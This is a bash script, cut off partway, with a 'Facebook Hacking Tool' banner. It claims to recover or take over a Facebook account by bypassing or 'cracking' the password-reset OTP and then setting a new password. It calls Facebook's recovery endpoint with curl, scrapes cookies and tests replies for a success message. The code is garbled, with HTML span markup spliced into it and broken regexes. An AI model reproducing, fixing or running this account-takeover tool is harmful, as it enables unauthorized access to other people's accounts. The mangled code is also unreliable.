#!/bin/bash

echo "
d88888b  .d8b.   .o88b. d88888b d8888b.  .d88b.   .d88b.  db   dD      db   db  .d8b.   .o88b. db   dD d888888b d8b   db  d888b       d888888b  .d88b.   .d88b.  db      
88'     d8' `8b d8P  Y8 88'     88  `8D .8P  Y8. .8P  Y8. 88 ,8P'      88   88 d8' `8b d8P  Y8 88 ,8P'   `88'   888o  88 88' Y8b      `~~88~~' .8P  Y8. .8P  Y8. 88      
88ooo   88ooo88 8P      88ooooo 88oooY' 88    88 88    88 88,8P        88ooo88 88ooo88 8P      88,8P      88    88V8o 88 88              88    88    88 88    88 88      
88~~~   88~~~88 8b      88~~~~~ 88~~~b. 88    88 88    88 88`8b        88~~~88 88~~~88 8b      88`8b      88    88 V8o88 88  ooo         88    88    88 88    88 88      
88      88   88 Y8b  d8 88.     88   8D `8b  d8' `8b  d8' 88 `88.      88   88 88   88 Y8b  d8 88 `88.   .88.   88  V888 88. ~8~         88    `8b  d8' `8b  d8' 88booo. 
YP      YP   YP  `Y88P' Y88888P Y8888P'  `Y88P'   `Y88P'  YP   YD      YP   YP YP   YP  `Y88P' YP   YD Y888888P VP   V8P  Y888P          YP     `Y88P'   `Y88P'  Y88888P 
                                                                                                                                                                         
                                                                                                                                                                         
"
# This script recovers a Facebook password using a cracked OTP and changes the password.

# USAGE:
# ./Fb_otp_bypass.sh <email> <phone_number> <new_password>

# EMAIL and PHONE_NUMBER must be valid.

# Example:
# ./Fb_otp_bypass.sh richmond@example.com +2376537127 newpassword123

# Check if the user has entered a valid email address
function check_email_address() {
 if ! [[ ${1} =~ ^[a-zA-Z0-9\.\\_%\\\+\\\-]+\@[a-zA-Z0-9\.\-\]+\.[a-zA-Z]{2,} ]]; then
  echo "Invalid email address."
  exit 1
 fi
}

# Check if the user has entered a valid phone number
function check_phone_number() {
 if ! [[ ${1} =~ ^\\\+\\\\\[0\-9\]\{1,3\}\[0\-9\]\{7,14\} ]]; then
  echo "Invalid phone number."
  exit 1
 fi
}

# Prompt the user to enter the OTP if they have it
function get_otp() {
 echo "Do you have an OTP? (y/n)"
 read has_otp

 if [[ $has_otp == "y" ]]; then
  echo "Enter the OTP you have already tried: "
  read -s otp

  if [ -n "$otp" ]; then
   return <span class="math-inline">\{otp\}
fi
fi
return ""
\}
\# Set the curl command options
CURL\_OPTIONS\="\-i \-s \-k \-X GET"
\# Get the headers and cookies from the URL
function get\_headers\_and\_cookies\(\) \{
HEADERS\=</span>(curl <span class="math-inline">\{CURL\_OPTIONS\} "https\://www\.facebook\.com/recover/code/?ph%5B0%5D\=</span>{1}")

 # Extract the cookies from the headers
 COOKIES=$(grep -Po "Set-Cookie: \K[^;]*" <<< "$HEADERS")

 echo "$HEADERS"
 echo "$COOKIES"
}

# Make a POST request
function make_post_request() {
 local headers=$1
 local cookies=$2
 local post_data=$3
 local url=<span class="math-inline">4
response\=</span>(curl ${CURL_OPTIONS} $headers -b "$cookies" --data-binary "$post_data" "$url")

 echo "$response"
}

# Check if the OTP was correct
function check_otp_correct() {
 local response=$1

 if grep -q "Password changed successfully" <<< "$response"; then
  echo "true"
 else
  echo "false"
 fi
}

# Change the password using the cracked OTP
function change_password() {
 local headers=$1
 local cookies=$2
 local new_password=<span class="math-inline">3
change\_password\_response\=</span>(curl ${CURL_OPTIONS} $headers
